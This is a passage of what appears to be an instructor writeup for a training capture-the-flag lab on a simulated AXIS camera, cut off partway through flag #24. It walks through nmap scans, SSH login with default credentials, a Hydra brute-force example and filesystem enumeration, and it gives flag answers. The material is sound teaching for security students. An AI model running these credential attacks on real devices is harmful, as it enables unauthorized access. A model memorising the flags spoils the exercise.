# AXIS Camera IoT Security CTF - Complete Instructor Writeup v11

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [IoT Penetration Testing Pedagogy](#iot-penetration-testing-pedagogy)
- [Initial Setup and Tool Installation](#initial-setup-and-tool-installation)
- [Initial Reconnaissance](#initial-reconnaissance)
- [SSH Access and Initial Enumeration](#ssh-access-and-initial-enumeration)
- [Easy Flags - Filesystem Discovery](#easy-flags-filesystem-discovery)
- [Medium Flags - Advanced Enumeration](#medium-flags-advanced-enumeration)
- [Hard Flags - Expert Techniques](#hard-flags-expert-techniques)

---

## Challenge Overview

**Target System**: AXIS Network Camera (Embedded Linux/BusyBox)  
**IP Address**: 192.168.148.103  
**Attacker System**: Kali Linux 192.168.1.133  
**Total Flags**: 27 (5 Easy, 13 Medium, 9 Hard)  
**Access Method**: SSH with default credentials (root:pass)  
**Writable Directories**: `/var/lib/axis/`, `/mnt/flash/`, `/dev/shm/`, `/run/`, `/tmp/`, `/var/cache/`  
**Focus**: OWASP IoT Top 10 vulnerabilities in embedded camera systems

---

## IoT Penetration Testing Pedagogy

### Teaching Philosophy for IoT Security

This CTF focuses on **systematic filesystem enumeration** as the core skill for IoT penetration testing. Unlike traditional systems where network protocol exploitation is primary, embedded devices often reveal all secrets through careful filesystem analysis.

### Core Concepts

#### Why SSH-Only Discovery?

**Pedagogical Rationale**:
1. **Real-World Accuracy**: Most IoT pentests gain initial access through default credentials, then pivot to filesystem enumeration
2. **Skill Development**: Forces students to learn Linux directory structures, file permissions, and data storage patterns
3. **Embedded System Understanding**: Students learn BusyBox constraints, vendor-specific layouts, and persistent storage mechanisms
4. **Systematic Methodology**: Teaches repeatable enumeration frameworks applicable to any embedded Linux device

#### Embedded Linux vs Traditional Linux

**Traditional Linux Systems**:
- Full GNU userland with extensive tools
- Standard Filesystem Hierarchy Standard (FHS)
- Multiple users with home directories
- Extensive logging and audit trails
- Package managers for tool installation
- Gigabytes of storage available

**Embedded BusyBox Systems (AXIS Camera)**:
- Minimal BusyBox utilities (~300 applets in one binary)
- Vendor-specific directory structures
- Single root user
- Limited logging (storage constraints)
- No package manager
- Megabytes of flash storage
- Read-only root filesystem with select writable locations

**Teaching Emphasis**: Students must adapt traditional Linux knowledge to embedded constraints. Commands like `apt install` don't exist. Tools must be cross-compiled. Storage is precious.

### Learning Objectives by Difficulty

#### Easy Flags (Foundation Building)
**Objective**: Teach systematic directory enumeration

Students learn to:
- Navigate vendor-specific directories (`/var/lib/axis/`)
- Read configuration files line-by-line
- Understand persistent storage locations
- Recognize standard log file patterns
- Use basic Linux commands effectively

**Methodology**:
```bash
# Step 1: Identify vendor directories
ls -la /var/lib/

# Step 2: Enumerate subdirectories
find /var/lib/axis/ -type f 2>/dev/null

# Step 3: Read all configuration files
for file in /var/lib/axis/conf/*; do
    echo "=== $file ==="
    cat "$file"
done
```

#### Medium Flags (Skill Development)
**Objective**: Teach advanced enumeration and basic analysis

Students learn to:
- Decode simple encodings (ROT13, base64)
- Parse JSON and XML configuration files
- Analyze database files (SQLite)
- Extract strings from binaries
- Understand runtime vs persistent storage

**Methodology**:
```bash
# Encoding recognition
cat file | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13

# Database analysis
sqlite3 /var/db/axis/camera.db ".tables"

# Binary string extraction
strings /usr/local/axis/bin/service | grep -i "key\|pass"
```

#### Hard Flags (Advanced Techniques)
**Objective**: Teach complex multi-step exploitation

Students learn to:
- Analyze shared memory segments
- Exploit race conditions with timing attacks
- Extract data from bootloader configurations
- Understand physical security implications
- Chain multiple enumeration steps

**Methodology**:
```bash
# Shared memory analysis
ls -la /dev/shm/axis/

# Race condition exploitation
while true; do ls /dev/shm/axis/runtime/ 2>/dev/null; done

# Bootloader analysis
cat /mnt/flash/boot/uboot/uboot.env
```

---

## Initial Setup and Tool Installation

### Tools Required on Kali Linux

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Core tools (should already be installed)
sudo apt install -y ssh nmap netcat-traditional

# Optional tools for advanced students
sudo apt install -y hydra medusa  # Credential attacks
sudo apt install -y sqlite3        # Database analysis
sudo apt install -y jq             # JSON parsing

# Create working directory
mkdir -p ~/ctf/axis/{scans,loot,flags,notes}
cd ~/ctf/axis
```

### Session Logging Setup

```bash
# Create logging script
cat > ~/ctf/axis/start_logging.sh << 'EOF'
#!/bin/bash
LOG_DIR="logs"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/axis_ctf_$(date +%Y%m%d_%H%M%S).log"
echo "[*] Logging to: $LOG_FILE"
script -f "$LOG_FILE"
EOF

chmod +x ~/ctf/axis/start_logging.sh
./start_logging.sh
```

**Why Log Everything?**
- Documents your methodology
- Provides evidence for reports
- Helps remember discovered information
- Required for professional assessments

---

## Initial Reconnaissance

### Phase 1: Network Discovery

```bash
# Verify target is online
ping -c 4 192.168.148.103
```

**Expected Output**:
```
PING 192.168.148.103 (192.168.148.103) 56(84) bytes of data.
64 bytes from 192.168.148.103: icmp_seq=1 ttl=64 time=0.428 ms
64 bytes from 192.168.148.103: icmp_seq=2 ttl=64 time=0.392 ms
64 bytes from 192.168.148.103: icmp_seq=3 ttl=64 time=0.401 ms
64 bytes from 192.168.148.103: icmp_seq=4 ttl=64 time=0.389 ms
```

**Analysis**:
- TTL=64 indicates Linux/Unix operating system
- Low latency confirms local network
- Consistent response times suggest stable device

### Phase 2: Port Scanning

```bash
# Quick service discovery
sudo nmap -sS -sV -T4 192.168.148.103 -oN scans/quick.txt

# Comprehensive scan
sudo nmap -sS -sV -sC -p- -T4 192.168.148.103 -oN scans/full.txt
```

**Expected Results**:
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http       BusyBox httpd 1.31.0
554/tcp  open  rtsp       AXIS Media Control
8080/tcp open  http-proxy
```

**Key Observations**:
- **Port 22 (SSH)**: Primary target for initial access
- **Port 80/8080 (HTTP)**: Web interface (not used for flag discovery in v11)
- **Port 554 (RTSP)**: Video streaming service
- **BusyBox httpd**: Confirms embedded Linux system

### Phase 3: SSH Banner Analysis

```bash
# Grab SSH banner
nc -nv 192.168.148.103 22
```

**Output**:
```
Connection to 192.168.148.103 22 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_7.4
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Warning: Authorized access only              *
*************************************************
```

**Intelligence Gathered**:
- AXIS-branded camera system
- Firmware version 10.5.0
- OpenSSH 7.4 (potentially outdated)

---

## SSH Access and Initial Enumeration

### Gaining SSH Access

**Default Credentials**: Many AXIS cameras ship with well-known defaults:
- Username: `root`
- Password: `pass`, `root`, or `admin`

```bash
# Attempt connection with common credentials
ssh root@192.168.148.103
# When prompted, enter: pass
```

**Successful Connection Output**:
```
*************************************************
* AXIS Camera SSH Service                      *
* Firmware: 10.5.0                              *
* Welcome to AXIS embedded Linux                *
*************************************************

BusyBox v1.31.0 (2021-04-15 12:34:56 UTC) built-in shell (ash)

axis-camera:~#
```

**Alternative**: If default credentials fail, use Hydra:
```bash
# Create password list
cat > axis_passwords.txt << EOF
pass
root
admin
password
axis
camera
EOF

# Brute force attack
hydra -l root -P axis_passwords.txt ssh://192.168.148.103
```

### Initial System Enumeration

Once connected via SSH, perform basic reconnaissance:

```bash
# System information
uname -a
cat /proc/cpuinfo | head -10
cat /proc/meminfo | head -5

# Available storage
df -h

# Mounted filesystems
mount | column -t

# Available commands
ls /bin /sbin /usr/bin /usr/sbin | wc -l
```

**Expected Output**:
```
Linux axis-camera 4.14.79 #1 SMP Thu Apr 15 12:34:56 UTC 2021 armv7l GNU/Linux

processor       : 0
model name      : ARMv7 Processor rev 1 (v7l)
BogoMIPS        : 38.40

MemTotal:         262144 kB
MemFree:           45678 kB

Filesystem      Size  Used Avail Use% Mounted on
/dev/root       256M  198M   58M  78% /
tmpfs           128M   12M  116M  10% /tmp
/dev/mtdblock3   64M   42M   22M  66% /mnt/flash
tmpfs            64M    4M   60M   7% /run
tmpfs            32M    2M   30M   7% /dev/shm
```

**Key Observations**:
- ARM-based processor (common in IoT)
- Limited RAM (256MB)
- Multiple writable locations for flag placement
- BusyBox environment (limited toolset)

### Understanding Writable Locations

**Critical for CTF**: Identify where flags can be placed:

```bash
# Test write permissions
for dir in / /tmp /var /mnt /dev/shm /run /sys /usr /var/lib; do
    touch "$dir/.test" 2>/dev/null && \
    echo "[WRITABLE] $dir" && \
    rm "$dir/.test" || \
    echo "[READONLY] $dir"
done
```

**Writable Directories on AXIS Camera**:
- `/tmp/` - Temporary files (clears on reboot)
- `/var/` - Variable data (persistent)
- `/var/lib/axis/` - AXIS-specific data (persistent)
- `/mnt/flash/` - Flash storage (persistent)
- `/dev/shm/` - Shared memory (volatile)
- `/run/` - Runtime data (volatile)
- `/var/cache/` - Cache storage (persistent)

---

## Easy Flags - Filesystem Discovery

### Teaching Strategy for Easy Flags

**Objective**: Build confidence through straightforward discoveries

**Method**: Systematic enumeration of vendor-specific directories

**Skills Taught**:
- Directory navigation
- Configuration file reading
- Log analysis
- Basic grep filtering

---

### FLAG #1: VAPIX Configuration File (EASY - 10 points)

**Location**: `/var/lib/axis/conf/vapix.conf`  
**Flag**: `FLAG{FRODO27189846}`  
**OWASP Category**: IoT-01 (Weak, Guessable, or Hardcoded Passwords)

**Discovery Method**:

```bash
# Navigate to AXIS configuration directory
cd /var/lib/axis/conf/

# List all configuration files
ls -la

# Read VAPIX configuration
cat vapix.conf
```

**Expected Output**:
```
# VAPIX API Configuration
# Generated: 2021-04-15

[general]
api_version = 3.0
enabled = true
port = 80

[authentication]
method = digest
require_auth = true
device_id = FLAG{FRODO27189846}

[features]
motion_detection = enabled
audio = enabled
ptz = disabled
```

**Why This Flag is Easy**:
- Located in obvious vendor directory
- Clear flag format in configuration
- Standard configuration file reading
- No encoding or obfuscation

**Pedagogical Value**:
- Teaches importance of vendor-specific directories
- Shows how device IDs/serials often leak
- Demonstrates configuration file analysis
- Introduces VAPIX API concept

**Real-World Parallel**: Device IDs, serial numbers, and API tokens frequently appear in plaintext configuration files on IoT devices.

---

### FLAG #4: System Logs (EASY - 10 points)

**Location**: `/var/log/messages`  
**Flag**: `FLAG{GIMLI42137246}`  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Discovery Method**:

```bash
# Check system logs
cat /var/log/messages
```

**Expected Output**:
```
Jan 27 10:15:23 axis-camera kernel: Initializing hardware...
Jan 27 10:15:24 axis-camera sshd[1234]: Server listening on 0.0.0.0 port 22
Jan 27 10:15:24 axis-camera sshd[1234]: Device initialization: FLAG{GIMLI42137246}
Jan 27 10:15:25 axis-camera httpd[1235]: BusyBox httpd started
Jan 27 10:15:26 axis-camera rtspd[1236]: RTSP server ready
```

**Why This Flag is Easy**:
- Standard log file location
- Clear flag in plain text
- Uses basic cat/grep commands
- No complex parsing required

**Pedagogical Value**:
- Teaches log file analysis
- Shows how verbose logging leaks information
- Demonstrates grep filtering
- Introduces /var/log/ directory structure

**Real-World Parallel**: Debug logging often exposes API keys, session tokens, and internal identifiers in production systems.

---

### FLAG #7: HTML Comments Archive (EASY - 10 points)

**Location**: `/var/www/local/admin/.comments.txt`  
**Flag**: `FLAG{MERRY36385024}`  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

```bash
# Navigate to web root
cd /var/www/local/admin/

# List all files including hidden
ls -la

# Read comments file
cat .comments.txt
```

**Expected Output**:
```
<!-- Developer Notes - Remove before production! -->
<!-- Admin panel last updated: 2021-04-15 -->
<!-- TODO: Implement proper authentication -->
<!-- Debug access code: FLAG{MERRY36385024} -->
<!-- Test credentials: admin/test123 -->
```

**Why This Flag is Easy**:
- Hidden file (starts with .) but in obvious location
- Clear HTML comment structure
- Simple cat command to view
- No encoding needed

**Pedagogical Value**:
- Teaches to check web directories even without web exploitation
- Shows importance of hidden files (ls -la vs ls)
- Demonstrates developer comments as information leak
- Introduces dot-file convention

**Real-World Parallel**: Developers often leave TODO comments, debug credentials, and API keys in HTML/JS files that end up in production.

---

### FLAG #14: Video Stream Configuration (EASY - 10 points)

**Location**: `/var/cache/recorder/streams/primary/stream_config.conf`  
**Flag**: `FLAG{SARUMAN83479324}`  
**OWASP Category**: IoT-06 (Insufficient Privacy Protection)

**Discovery Method**:

```bash
# Navigate to recorder cache
cd /var/cache/recorder/streams/primary/

# List stream files
ls -la

# Read configuration
cat stream_config.conf
```

**Expected Output**:
```
[stream_primary]
resolution = 1920x1080
framerate = 30
codec = H.264
bitrate = 4000

[access]
rtsp_url = rtsp://192.168.148.103:554/stream1
auth_token = FLAG{SARUMAN83479324}
require_auth = false

[recording]
enabled = true
retention_days = 7
```

**Why This Flag is Easy**:
- Logical directory structure (cache/recorder/streams)
- Standard config file format
- Direct cat command works
- Clear auth_token field

**Pedagogical Value**:
- Teaches cache directory enumeration
- Shows video stream credential exposure
- Demonstrates logical directory traversal
- Introduces RTSP authentication tokens

**Real-World Parallel**: Streaming credentials and API tokens in cache files are common in IP cameras, allowing unauthorized stream access.

---

### FLAG #19: Factory Configuration (EASY - 10 points)

**Location**: `/mnt/flash/config/factory/device_info.txt`  
**Flag**: `FLAG{THEODEN40558954}`  
**OWASP Category**: IoT-09 (Insecure Default Settings)

**Discovery Method**:

```bash
# Navigate to flash storage
cd /mnt/flash/config/factory/

# List factory files
ls -la

# Read device information
cat device_info.txt
```

**Expected Output**:
```
AXIS Camera Factory Configuration
==================================
Serial Number: 00408CDE1234
MAC Address: 00:40:8C:DE:12:34
Model: AXIS M1025
Firmware: 10.5.0
Manufacturing Date: 2021-04-15

[Factory Test Data]
Test Mode: Passed
Calibration: Completed
QA Code: FLAG{THEODEN40558954}

[Default Credentials]
Username: root
Password: pass
```

**Why This Flag is Easy**:
- Clear directory name (factory)
- Obvious file name (device_info.txt)
- Plain text format
- Includes default credentials (bonus finding)

**Pedagogical Value**:
- Teaches persistent storage exploration
- Shows factory configuration as attack surface
- Demonstrates manufacturing data leakage
- Reveals default credential storage

**Real-World Parallel**: Factory configuration files often contain default credentials, test modes, and debugging information left enabled in production.

---

## Medium Flags - Advanced Enumeration

### Teaching Strategy for Medium Flags

**Objective**: Develop advanced analysis skills

**Method**: Multi-step discovery requiring:
- Encoding/decoding (ROT13, base64)
- Data parsing (JSON, XML, SQL)
- Binary analysis (strings extraction)
- Certificate inspection
- Persistence mechanism analysis

**Skills Taught**:
- Basic cryptanalysis
- Structured data parsing
- Database querying
- String extraction from binaries
- Hidden directory discovery

---

### FLAG #2: License File with ROT13 (MEDIUM - 20 points)

**Location**: `/var/lib/persistent/system/licenses/vapix_pro.lic`  
**Flag**: `FLAG{ARAGORN79305394}` (after ROT13 decoding)  
**OWASP Category**: IoT-01 (Weak Passwords)

**Discovery Method**:

```bash
# Navigate to licenses
cd /var/lib/persistent/system/licenses/

# Read license file
cat vapix_pro.lic
```

**Expected Output** (ROT13 encoded):
```
[License Information]
Product: VAPIX Professional Edition
License Key: SYNT{NENTBEA79305394}
Issued: 2021-04-15
Expires: 2023-04-15
Activation: 00408CDE1234
```

**Decoding Steps**:

```bash
# ROT13 decode the license key
echo "SYNT{NENTBEA79305394}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Output: FLAG{ARAGORN79305394}
```

**Alternative Methods**:
```bash
# Python one-liner
echo "SYNT{NENTBEA79305394}" | python3 -c "import sys; print(''.join(chr((ord(c)-65+13)%26+65) if c.isupper() else chr((ord(c)-97+13)%26+97) if c.islower() else c for c in sys.stdin.read()))"

# Online tool (not recommended in real assessments)
# https://rot13.com
```

**Why This Flag is Medium**:
- Requires encoding recognition
- Needs additional decoding step
- Located in multi-level directory
- Tests pattern recognition skills

**Pedagogical Value**:
- Teaches ROT13 encoding recognition (FLAG -> SYNT)
- Demonstrates weak obfuscation ≠ encryption
- Shows license key as attack vector
- Introduces tr command for character translation

**Real-World Parallel**: Many IoT devices use weak encoding (ROT13, XOR, base64) thinking it provides security. It doesn't.

---

### FLAG #5: SSH Key Comments (MEDIUM - 20 points)

**Location**: `/var/lib/persistent/security/keys/authorized_keys`  
**Flag**: `FLAG{BOROMIR73553172}`  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Discovery Method**:

```bash
# Navigate to SSH keys
cd /var/lib/persistent/security/keys/

# Read authorized keys
cat authorized_keys
```

**Expected Output**:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... root@axis
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDf... admin@backup-server
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDm... FLAG{BOROMIR73553172}
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... maintenance@axis.local
```

**Why This Flag is Medium**:
- Non-obvious file location
- Requires knowledge of SSH key structure
- Comments not obvious purpose
- Multi-line file analysis

**Pedagogical Value**:
- Teaches SSH authorized_keys file format
- Shows key comments as information leak
- Demonstrates alternative authentication mechanisms
- Introduces public key authentication

**Real-World Parallel**: SSH key comments often contain email addresses, hostnames, and purposes that aid in lateral movement.

---

### FLAG #6: JSON Stream Metadata (MEDIUM - 25 points)

**Location**: `/var/cache/recorder/analytics/metadata/stream_analysis.json`  
**Flag**: `FLAG{SAMWISE04969098}`  
**OWASP Category**: IoT-02 (Insecure Network Services)

**Discovery Method**:

```bash
# Navigate to analytics metadata
cd /var/cache/recorder/analytics/metadata/

# Read JSON file
cat stream_analysis.json
```

**Expected Output**:
```json
{
  "stream_id": "primary_stream_001",
  "analysis": {
    "motion_detection": {
      "enabled": true,
      "sensitivity": 75,
      "zones": [
        {"id": 1, "coordinates": "0,0,1920,540"},
        {"id": 2, "coordinates": "0,540,1920,1080"}
      ]
    },
    "analytics": {
      "object_detection": true,
      "face_detection": false,
      "license_plate": false
    },
    "metadata": {
      "session_id": "550e8400-e29b-41d4-a716-446655440000",
      "api_key": "FLAG{SAMWISE04969098}",
      "started": "2024-01-27T10:15:00Z"
    }
  }
}
```

**Parsing Methods**:

```bash
# Using jq (if available)
cat stream_analysis.json | jq '.analysis.metadata.api_key'

# Manual inspection
cat stream_analysis.json | grep api_key
```

**Why This Flag is Medium**:
- Requires JSON structure understanding
- Nested data structure
- API key hidden in metadata field
- Introduces structured data parsing

**Pedagogical Value**:
- Teaches JSON parsing skills
- Shows API keys in analytics metadata
- Demonstrates nested data extraction
- Introduces jq tool (if available)

**Real-World Parallel**: Video analytics platforms often embed API keys, session tokens, and cloud credentials in JSON configuration files.

---

### FLAG #8: VAPIX Response Log (MEDIUM - 25 points)

**Location**: `/var/lib/axis/conf/vapix_response.log`  
**Flag**: `FLAG{PIPPIN54784931}`  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

```bash
# Check VAPIX logs
cd /var/lib/axis/conf/

# Read response log
cat vapix_response.log
```

**Expected Output**:
```
[2024-01-27 10:15:23] GET /axis-cgi/param.cgi?action=list
[2024-01-27 10:15:23] Response: 200 OK
[2024-01-27 10:15:24] GET /axis-cgi/param.cgi?action=get&name=root.Brand.ProdNbr
[2024-01-27 10:15:24] Response: 200 OK
[2024-01-27 10:15:24] Data: root.Brand.ProdNbr=M1025
[2024-01-27 10:15:25] POST /axis-cgi/param.cgi?action=update
[2024-01-27 10:15:25] Auth-Token: FLAG{PIPPIN54784931}
[2024-01-27 10:15:25] Response: 200 OK
[2024-01-27 10:15:26] Parameter updated successfully
```

**Why This Flag is Medium**:
- Log file analysis required
- API interaction understanding
- Multi-line search needed
- Authentication token recognition

**Pedagogical Value**:
- Teaches API request logging
- Shows authentication token leakage
- Demonstrates log correlation
- Introduces VAPIX API concepts

**Real-World Parallel**: API request/response logs frequently contain authentication tokens, session IDs, and credentials for debugging purposes.

---

### FLAG #9: Firmware Signature Metadata (MEDIUM - 25 points)

**Location**: `/mnt/flash/firmware/signatures/firmware_10.5.0.sig`  
**Flag**: `FLAG{GANDALF19774520}`  
**OWASP Category**: IoT-04 (Lack of Secure Update Mechanism)

**Discovery Method**:

```bash
# Navigate to firmware signatures
cd /mnt/flash/firmware/signatures/

# List signature files
ls -la

# Read signature file
cat firmware_10.5.0.sig
```

**Expected Output**:
```
-----BEGIN FIRMWARE SIGNATURE-----
Version: 10.5.0
Model: AXIS M1025
Timestamp: 2021-04-15T12:34:56Z
Build ID: FLAG{GANDALF19774520}
Signature Algorithm: RSA-SHA256

MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
[truncated signature data]
-----END FIRMWARE SIGNATURE-----
```

**Why This Flag is Medium**:
- Firmware directory discovery
- Signature file format understanding
- Build metadata analysis
- Multiple files to check

**Pedagogical Value**:
- Teaches firmware update mechanisms
- Shows signature verification concepts
- Demonstrates build identifier exposure
- Introduces cryptographic signatures

**Real-World Parallel**: Firmware signature files often expose build environments, developer information, and private key identifiers.

---

### FLAG #10: Factory Test Mode (MEDIUM - 25 points)

**Location**: `/mnt/flash/config/factory/test_mode.conf`  
**Flag**: `FLAG{LEGOLAS81553308}`  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Discovery Method**:

```bash
# Explore factory configuration
cd /mnt/flash/config/factory/

# List all factory files
ls -la

# Read test mode configuration
cat test_mode.conf
```

**Expected Output**:
```
[Factory Test Mode Configuration]
enabled = true
uart_debug = enabled
jtag_access = enabled
factory_reset_code = 1234

[Test Credentials]
test_user = factory
test_password = FLAG{LEGOLAS81553308}

[Diagnostic Ports]
telnet = 23
uart = /dev/ttyS0
jtag_port = enabled
```

**Why This Flag is Medium**:
- Factory configuration enumeration
- Test mode understanding
- Security implications of enabled test features
- Multiple configuration sections

**Pedagogical Value**:
- Teaches factory/test mode as attack surface
- Shows debug features left enabled
- Demonstrates diagnostic port exposure
- Introduces UART/JTAG concepts

**Real-World Parallel**: Many IoT devices ship with test modes and debug interfaces enabled, providing backdoor access.

---

### FLAG #11: Runtime Service Config (MEDIUM - 25 points)

**Location**: `/run/axis/services/camera_service.conf`  
**Flag**: `FLAG{TREEBEARD58447193}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to runtime services
cd /run/axis/services/

# List service configurations
ls -la

# Read camera service config
cat camera_service.conf
```

**Expected Output**:
```
[Camera Service Runtime]
pid = 1234
status = running
uptime = 3600

[API Endpoints]
rest_api = http://127.0.0.1:8080
internal_api = http://127.0.0.1:9000
admin_token = FLAG{TREEBEARD58447193}

[Resource Usage]
memory_usage = 24MB
cpu_usage = 12%
threads = 8
```

**Why This Flag is Medium**:
- Runtime vs persistent storage understanding
- Service configuration analysis
- Internal API token discovery
- /run directory knowledge

**Pedagogical Value**:
- Teaches runtime data enumeration
- Shows volatile vs persistent storage
- Demonstrates internal API tokens
- Introduces /run directory purpose

**Real-World Parallel**: Runtime service configurations often contain temporary credentials and internal API endpoints not meant for external access.

---

### FLAG #12: Backup Script with API Key (MEDIUM - 25 points)

**Location**: `/usr/local/axis/share/scripts/backup_service.sh`  
**Flag**: `FLAG{CELEBORN26694785}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to scripts directory
cd /usr/local/axis/share/scripts/

# List scripts
ls -la

# Read backup script
cat backup_service.sh
```

**Expected Output**:
```bash
#!/bin/sh
# Automated Backup Service
# Runs daily at 02:00

BACKUP_SERVER="backup.axis.local"
BACKUP_USER="camera_backup"
BACKUP_API_KEY="FLAG{CELEBORN26694785}"

# Create backup archive
tar czf /tmp/axis_backup_$(date +%Y%m%d).tar.gz \
    /var/lib/axis/ \
    /mnt/flash/config/ \
    /var/cache/recorder/

# Upload to backup server
curl -X POST \
    -H "Authorization: Bearer $BACKUP_API_KEY" \
    -F "file=@/tmp/axis_backup_$(date +%Y%m%d).tar.gz" \
    https://$BACKUP_SERVER/api/upload

# Cleanup
rm -f /tmp/axis_backup_*.tar.gz
```

**Why This Flag is Medium**:
- Script analysis required
- Multiple directories checked
- API key in environment variable
- Backup process understanding

**Pedagogical Value**:
- Teaches script enumeration
- Shows hardcoded API keys in scripts
- Demonstrates backup mechanisms
- Introduces automated task analysis

**Real-World Parallel**: Backup scripts universally contain cloud storage credentials, API keys, and authentication tokens in plaintext.

---

### FLAG #13: CGroup Service Config (MEDIUM - 30 points)

**Location**: `/var/lib/axis/cgroup/axis/camera.service/service.conf`  
**Flag**: `FLAG{GALADRIEL47829561}`  
**OWASP Category**: IoT-08 (Lack of Device Management)

**Discovery Method**:

```bash
# Navigate to cgroup configuration
cd /var/lib/axis/cgroup/axis/camera.service/

# Read service configuration
cat service.conf
```

**Expected Output**:
```
[CGroup Configuration]
service_name = camera.service
cpu_limit = 50%
memory_limit = 64MB

[Resource Control]
enabled = true
priority = high
restart_policy = always

[Management]
control_group = axis
admin_access_code = FLAG{GALADRIEL47829561}
monitoring = enabled
```

**Why This Flag is Medium**:
- Deep directory structure
- CGroup concept understanding
- Resource control knowledge
- Multi-level navigation

**Pedagogical Value**:
- Teaches Linux control groups (cgroups)
- Shows resource management configs
- Demonstrates nested directory enumeration
- Introduces containerization concepts

**Real-World Parallel**: Control group configurations expose resource limits, management interfaces, and administrative access controls.

---

### FLAG #15: UPnP Device XML (MEDIUM - 20 points)

**Location**: `/var/lib/axis/conf/upnp_device.xml`  
**Flag**: `FLAG{HALDIR92336184}`  
**OWASP Category**: IoT-09 (Insecure Default Settings)

**Discovery Method**:

```bash
# Check configuration directory
cd /var/lib/axis/conf/

# Read UPnP configuration
cat upnp_device.xml
```

**Expected Output**:
```xml
<?xml version="1.0"?>
<root xmlns="urn:schemas-upnp-org:device-1-0">
  <device>
    <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
    <friendlyName>AXIS M1025 Network Camera</friendlyName>
    <manufacturer>AXIS Communications</manufacturer>
    <modelName>M1025</modelName>
    <modelNumber>M1025</modelNumber>
    <serialNumber>00408CDE1234</serialNumber>
    <UDN>uuid:550e8400-e29b-41d4-a716-446655440000</UDN>
    <deviceID>FLAG{HALDIR92336184}</deviceID>
  </device>
</root>
```

**Why This Flag is Medium**:
- XML parsing required
- UPnP protocol knowledge
- Device description understanding
- Structured data navigation

**Pedagogical Value**:
- Teaches XML structure
- Shows UPnP device descriptors
- Demonstrates service discovery files
- Introduces UUID/device ID concepts

**Real-World Parallel**: UPnP device descriptions expose network topology, model numbers, and internal identifiers to local network attackers.

---

### FLAG #16: Certificate with Embedded Data (MEDIUM - 30 points)

**Location**: `/var/lib/persistent/network/certificates/server_cert.pem`  
**Flag**: `FLAG{ELROND34719845}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to certificates
cd /var/lib/persistent/network/certificates/

# List certificates
ls -la

# Read certificate file
cat server_cert.pem
```

**Expected Output**:
```
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKJ8F7mHp6O4MA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
[certificate data...]
-----END CERTIFICATE-----

[Certificate Metadata]
Subject: CN=axis-camera.local
Issuer: CN=AXIS Internal CA
Serial Number: 00:A2:7C:17:B9:87:A7:A3:B8
Validity: 2021-04-15 to 2023-04-15
Comment: Internal Device Certificate - FLAG{ELROND34719845}
```

**Analysis Commands**:
```bash
# View certificate details (if openssl available)
openssl x509 -in server_cert.pem -text -noout

# Search for flag in comments
grep -A5 "Comment" server_cert.pem
```

**Why This Flag is Medium**:
- Certificate inspection required
- Metadata understanding
- Multiple analysis approaches
- PEM format recognition

**Pedagogical Value**:
- Teaches X.509 certificate structure
- Shows certificate metadata as info leak
- Demonstrates TLS/SSL certificate analysis
- Introduces openssl tool usage

**Real-World Parallel**: SSL certificates often contain organizational information, admin emails, and internal domain names in subject fields.

---

### FLAG #17: Debug Configuration (MEDIUM - 20 points)

**Location**: `/var/lib/axis/conf/debug.conf`  
**Flag**: `FLAG{EOWYN77727102}`  
**OWASP Category**: IoT-08 (Lack of Device Management)

**Discovery Method**:

```bash
# Check for debug configurations
cd /var/lib/axis/conf/

# Read debug config
cat debug.conf
```

**Expected Output**:
```
[Debug Configuration]
debug_mode = enabled
verbose_logging = true
log_level = DEBUG

[Debug Interfaces]
telnet_port = 23
uart_debug = /dev/ttyS0
debug_api_port = 9999
debug_password = FLAG{EOWYN77727102}

[Diagnostic Features]
core_dumps = enabled
memory_profiling = enabled
network_tracing = enabled
```

**Why This Flag is Medium**:
- Debug interface discovery
- Security implications understanding
- Multiple enabled features
- Configuration analysis

**Pedagogical Value**:
- Teaches debug mode as vulnerability
- Shows dangerous enabled features
- Demonstrates diagnostic interface exposure
- Introduces core dump concepts

**Real-World Parallel**: Debug interfaces, diagnostic ports, and verbose logging frequently remain enabled in production IoT deployments.

---

### FLAG #24: SQLite Database Query (MEDIUM - 30 points)

**Location**: `/var/db/axis/camera_events.db` (SQLite database)  
**Flag**: `FLAG{DENETHOR51483927}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Discovery Method**:

```bash
# Navigate to database directory
cd /var/db/axis/

# List databases
ls -la

# Check if sqlite3 is available
which sqlite3

# Query the database (if sqlite3 available)
sqlite3 camera_events.db
```

**If sqlite3 is available**:
```sql
-- List tables
.tables

-- Show schema
.schema events

-- Query events table
SELECT * FROM events WHERE event_type = 'admin_access';

-- Expected result includes:
-- event_id | timestamp | event_type | details
-- 1234 | 2024-01-27 10:15:00 | admin_access | access_code: FLAG{DENETHOR51483927}
```

**If sqlite3 is NOT available** (typical for BusyBox):
```bash
# Read raw database file
strings camera_events.db
```

**Why This Flag is Medium**:
